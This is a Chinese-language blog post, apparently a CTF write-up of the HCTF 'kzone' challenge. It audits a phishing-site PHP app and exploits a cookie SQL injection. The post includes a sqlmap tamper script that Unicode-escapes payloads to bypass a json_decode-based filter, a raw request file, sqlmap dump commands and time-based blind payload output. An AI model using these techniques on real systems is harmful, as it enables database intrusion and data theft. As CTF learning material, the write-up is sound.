@@ -1,0 +1,339 @@
+---
+layout: post
+title:  "2019-11-20-01"
+description: 谨言慎行,谨小慎微
+date:   2019-11-20
+tags: linux命令 php sqlmap使用 网站文件泄露扫描 waf绕过
+excerpt_separator: ~~~
+---
+1.linux查找文件命令:
+
+find / -name sqlmap
+
+command > filename 把标准输出重定向到一个新文件中(>> 为追加)
+
+2.php弱类型比较
+
+3.php防注入较全代码(见文章)
+
+4.json_decode漏洞,会解码unicode编码
+
+5.sqlmap的使用(这里是时间注入)(见文章),常用参数-v(可以看到发包信息,payload信息,返回信息等),-p(只对指定的参数进行注入,但好像可以用*代替哈哈) 参考:https://blog.csdn.net/freeking101/article/details/72472141 https://blog.csdn.net/ski_12/article/details/58188331
+
+6.扫描网站目录,是否存在源码泄露
+
+~~~
+# kzone
+## 真是一言难尽的一道题..................不过真的学到好多新知识~
+## 侦测阶段
+打开题目,发现跳转到QQ空间，可能是钓鱼网站，于是curl一下(我这里用burp抓跳转前的包)
+
+![My helpful screenshot](/assets/img/2019-11-20-01/1.png)
+
+从代码发现原网站(未跳转前的网站)输入的表单被发送到2018.php里,判断这为钓鱼网站.尝试扫描网站目录
+
+![My helpful screenshot](/assets/img/2019-11-20-01/2.png)
+
+发现www.zip源码泄露
+```
+http://kzone.2018.hctf.io/www.zip
+```
+## 代码审计
+首先是结构：
+
+admin文件夹：管理整个钓鱼网站，导出、查看、删除钓鱼信息
+
+include文件：包含一些功能性文件
+
+2018.php：钓鱼插入文件
+
+对这两个登陆页面的源码2018.php和login.php进行审计。发现大概是将钓鱼用户的信息插入数据库，代码使用了许多sql语句，所以查看过滤. 既然两者都包含了./include/common.php这个文件,进去看.
+
+发现其包含了很多功能文件
+```php
+require_once "safe.php";
+require_once ROOT."function.php";
+require_once ROOT."member.php";
+require_once ROOT."os.php";
+require_once ROOT."kill.intercept.php";
+```
+发现/include/safe.php有全局过滤(过滤得真全,值得学习下)
+```php
+<?php
+function waf($string)
+{
+    $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|<|>|\#|\s/i';
+    return preg_replace_callback($blacklist, function ($match) {
+        return '@' . $match[0] . '@';//M:blacklist中有匹配到的字符串,在其两边加@
+    }, $string);
+}
+
+function safe($string)
+{
+    if (is_array($string)) {//M:如果字符串里是数组,进一步对数组的键值进行过滤
+        foreach ($string as $key => $val) {
+            $string[$key] = safe($val);
+        }
+    } else {
+        $string = waf($string);
+    }
+    return $string;
+}
+
+foreach ($_GET as $key => $value) {
+    if (is_string($value) && !is_numeric($value)) {//M:确保输入的值是字符串且字符串不能为数字字符串
+        $value = safe($value);
+    }
+    $_GET[$key] = $value;
+}
+foreach ($_POST as $key => $value) {
+    if (is_string($value) && !is_numeric($value)) {
+        $value = safe($value);
+    }
+    $_POST[$key] = $value;
+}
+foreach ($_COOKIE as $key => $value) {
+    if (is_string($value) && !is_numeric($value)) {
+        $value = safe($value);
+    }
+    $_COOKIE[$key] = $value;
+}
+unset($cplen, $key, $value);
+?>
+```
+并且username和password都经过了addslashes函数转义(在预定义字符之前添加反斜杠的字符串(上来就过滤))，不存在宽字节注入，无法逃逸掉单引号
+
+过滤了get,post,cookie
+
+但是http header应该没经过过滤，于是想到可否控制ip，然后达成insert注入,跟一下real_ip()
+```
+function real_ip()
+{
+    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ip = $list[0];
+    }
+    if (!ip2long($ip)) {
+        $ip = '';
+    }
+    return $ip;
+}
+```
+发现虽然可以用xff，但是有ip2long的验证，这条路不通。
+
+继续往common.php里导入得php功能文件查看,看有没有突破点
+
+在member.php发现突破口
+```php
+if (isset($_COOKIE["islogin"])) {
+    if ($_COOKIE["login_data"]) {
+        $login_data = json_decode($_COOKIE['login_data'], true);
+        $admin_user = $login_data['admin_user'];
+        $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
+        if ($udata['username'] == '') {
+            setcookie("islogin", "", time() - 604800);
+            setcookie("login_data", "", time() - 604800);
+        }
+        $admin_pass = sha1($udata['password'] . LOGIN_KEY);
+        if ($admin_pass == $login_data['admin_pass']) {
+            $islogin = 1;
+        } else {
+            setcookie("islogin", "", time() - 604800);
+            setcookie("login_data", "", time() - 604800);
+        }
+    }
+}
+```
+大佬的思路好是好,但好像有点考虑太多了,导致我一路踩坑,下面分析下我的踩坑之路:
+
+## 开始时按大佬的思路走:(大佬的一些过程在我测试时行不通,后面有我行得通的过程)
+
+在做admin校验的时候用了弱比较
+```php
+if ($admin_pass == $login_data['admin_pass']) 
+{
+    $islogin = 1;
+}
+```
+password是从$udata中获取的，不需要已知。尝试构造login_data={“admin_user”:”admin”,”admin_pass”:1}，对1所在的位置进行爆破，当admin_pass=65时，可以绕过，但是并不能登陆进去，可能是没有写入cookie，因此放弃了这个思路。(坑1:我跑出来的是48)
+
+![My helpful screenshot](/assets/img/2019-11-20-01/3.png)
+
+我们发现在用cookie做身份校验的时候查询了数据库
+```php
+if ($_COOKIE["login_data"]) {
+        $login_data = json_decode($_COOKIE['login_data'], true);
+        $admin_user = $login_data['admin_user'];
+        $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
+```
+发现其中用了json_decode，那么我们可以尝试使用编码进行bypass，即可无视一切过滤进行注入
+```
+payload = payload.replace('u', '\u0075')
+payload = payload.replace('o', '\u006f')
+payload = payload.replace('i', '\u0069')
+payload = payload.replace('\'', '\u0027')
+payload = payload.replace('\"', '\u0022')
+payload = payload.replace(' ', '\u0020')
+payload = payload.replace('s', '\u0073')
+payload = payload.replace('#', '\u0023')
+payload = payload.replace('>', '\u003e')
+payload = payload.replace('<', '\u003c')
+payload = payload.replace('-', '\u002d')
+payload = payload.replace('=', '\u003d')
+```
+![My helpful screenshot](/assets/img/2019-11-20-01/4.png)
+
+![My helpful screenshot](/assets/img/2019-11-20-01/5.png)
+
+于是尝试数据库注入，打开神器sqlmap，编写一下tamper：
+```
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    data = '''{"admin_user":"admin%s","admin_pass":65};'''
+    payload = payload.lower()
+    payload = payload.replace('u', '\u0075')
+    payload = payload.replace('o', '\u006f')
+    payload = payload.replace('i', '\u0069')
+    payload = payload.replace('\'', '\u0027')
+    payload = payload.replace('\"', '\u0022')
+    payload = payload.replace(' ', '\u0020')
+    payload = payload.replace('s', '\u0073')
+    payload = payload.replace('#', '\u0023')
+    payload = payload.replace('>', '\u003e')
+    payload = payload.replace('<', '\u003c')
+    payload = payload.replace('-', '\u002d')
+    payload = payload.replace('=', '\u003d')
+    return data % payload
+```
+然后我们知道，目标肯定是Mysql，且这里用bool注入即可，那么我们指定bool盲注
+
+sqlmap命令构建:
+```
+sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location --dbs
+```
+## 我后来测试成功的情况
+由于大佬没有给出1.txt的构建情况,我就自个想办法构造.我构造了很多很多,也测试了很多
+
+发现都跑不通,大佬这个脚本应该是没问题的,但我确实弄不了了.....就换种方式吧
+
+先贴上我最后弄成功的:参考另一个大佬脚本:```https://xz.aliyun.com/t/3245#toc-4```
+
+1.txt(注意,*表明往这里注入)(/admin/login.php等也行,可以输入进去就行)
+```
+POST /admin/list.php HTTP/1.1
+Host: 9abd7659-a183-4efd-8a2c-1ff37fbab798.node3.buuoj.cn
+Content-Length: 33
+Cache-Control: max-age=0
+Origin: http://9abd7659-a183-4efd-8a2c-1ff37fbab798.node3.buuoj.cn
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Referer: http://9abd7659-a183-4efd-8a2c-1ff37fbab798.node3.buuoj.cn/admin/login.php
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 127.0.1.3,1,2,3,4
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
+Cookie: PHPSESSID=7notm2n004aen7oln00ohd9ei3; islogin=1; login_data=*
+Connection: close
+
+user=rr123&pass=rr123&login=Login
+```
+hctf.py(文件记得丢到tamper文件夹下,还有好多其他的官方tamper)
+```python
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    data = '''{"admin_user":"%s"};'''
+    payload = payload.lower()
+
+    payload = payload.replace('u', '\u0075')
+    payload = payload.replace('o', '\u006f')
+    payload = payload.replace('i', '\u0069')
+    payload = payload.replace('\'', '\u0027')
+    payload = payload.replace('\"', '\u0022')
+    payload = payload.replace(' ', '\u0020')
+    payload = payload.replace('s', '\u0073')
+    payload = payload.replace('#', '\u0023')
+    payload = payload.replace('>', '\u003e')
+    payload = payload.replace('<', '\u003c')
+    payload = payload.replace('-', '\u002d')
+    payload = payload.replace('=', '\u003d')
+    payload = payload.replace('f1a9', 'F1a9')
+    payload = payload.replace('f1', 'F1')
+    return data % payload
+```
+sqlmap命令(先从探测数据库开始,/_include/sqlmap_output.txt有记录)
+```
+python sqlmap -r 1.txt --tamper=hctf --dbs --dbms=mysql --thread=10 -v3
+python sqlmap -r 1.txt --tamper=hctf --table --dbms=mysql --thread=10 -D hctf_kouzone -v3
+python sqlmap -r 1.txt --tamper=hctf --column --dbms=mysql --thread=10 -D hctf_kouzone -T fish_admin -v3
+python sqlmap -r 1.txt --tamper=hctf --column --dbms=mysql --thread=10 -D hctf_kouzone -T fl2222g -C f44ag --dump -v3
+```
+我重新整合了下思路,既然注入点是login_data里的admin_user的值,那和admin_pass没什么关系,就不需要带上这个数据了(也就是说admin_pass跑出来48也没什么用,当然,这可以作为后续步骤,即注入失败时,寻找新的方式).所以开头直接只带admin_user,如下:
+```
+python sqlmap -r 1.txt --tamper=hctf --dbs --dbms=mysql --thread=10 -v3
+```
+就不要注明用什么类型的注入,让程序自己检测
+
+注入的过程需要注意的点:(详细看/_include/sqlmap_output.txt)
+
+1.是否直接往('*')标记的地方注入?是
+```
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] y
+```
+2.这里不需要url编码cookie(可以通过参数"-v 4"查看发出的头来看看最终发出的数据都有哪些 )
+```
+do you want to URL encode cookie values (implementation specific)? [Y/n] n
+```
+3.存在注入点,是否继续探测以判断什么类型等信息(好像就第一次探测会有,到后面继续输入其他注入命令的时候这一步就没了,可能是一些文件缓存了下来,应该是记录了主机地址之类的)
+```
+[14:22:55] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+```
+4.类型为时间注入:
+```
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: Cookie #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: PHPSESSID=7notm2n004aen7oln00ohd9ei3; islogin=1; login_data=' AND (SELECT 3493 FROM (SELECT(SLEEP(5)))qprC) AND 'pVAy'='pVAy
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+```
+5.默认盲注间隔时间为5s,以下在询问是否需要测试最佳盲注间隔时间
+```
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+```
+6.是否开启多线程?否(这里我是怕出什么问题,就没有,一般不推荐用)
+```
+multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] n
+```
+应该到这里完结了,我太难了...................................(但加油啊)
+## 知识点:
+1.linux查找文件命令:
+
+find / -name sqlmap
+
+command > filename 把标准输出重定向到一个新文件中(>> 为追加)
+
+2.php弱类型比较
+
+3.php防注入较全代码(见文章)
+
+4.json_decode漏洞,会解码unicode编码
+
+5.sqlmap的使用(这里是时间注入)(见文章),常用参数-v(可以看到发包信息,payload信息,返回信息等),-p(只对指定的参数进行注入,但好像可以用*代替哈哈) 参考:```https://blog.csdn.net/freeking101/article/details/72472141``` ```https://blog.csdn.net/ski_12/article/details/58188331```
+
+6.扫描网站目录,是否存在源码泄露
